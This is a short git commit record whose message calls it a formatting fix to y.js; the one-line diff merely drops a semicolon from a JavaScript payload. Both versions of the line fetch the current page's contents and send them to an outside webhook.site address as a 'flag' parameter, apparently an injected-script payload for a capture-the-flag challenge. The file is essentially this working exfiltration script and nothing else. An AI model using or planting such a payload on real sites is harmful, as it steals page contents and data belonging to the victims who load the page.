45d770f9efb31350dd1f571d4fee791119451f7e
aljzayryaltrath-hash <aljzayryaltrath@gmail.com>
2026-06-16 14:02:16 +0100

    Fix formatting issue in y.js

--- y.js
+++ y.js
@@ -1,1 +1,1 @@
-fetch(window.location.href).then(r=>r.text()).then(d=>fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag='+encodeURIComponent(d)));
+fetch(window.location.href).then(r=>r.text()).then(d=>fetch('https://webhook.site/f4209e86-ce3c-4e0c-aa91-31dbd14f2ad6?flag='+encodeURIComponent(d)))
